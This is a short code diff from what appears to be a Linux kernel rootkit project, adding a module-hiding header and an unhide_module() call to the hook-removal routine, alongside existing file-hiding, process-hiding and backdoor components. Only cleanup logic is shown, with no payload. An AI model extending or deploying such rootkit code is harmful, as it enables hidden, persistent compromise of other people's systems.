@@ -9,6 +9,7 @@
 #include "common.h"
 #include "hook.h"
 #include "rootkit.h"
+#include "modhide.h"
 #include "filehide.h"
 #include "backdoor.h"
 #include "hidepid.h"
@@ -73,6 +74,9 @@ init_hooks(void)
 void
 remove_hooks(void)
 {
+    if (rootkit.hiding_module)
+        unhide_module();
+
     if (rootkit.hiding_files)
         unhide_files();
 
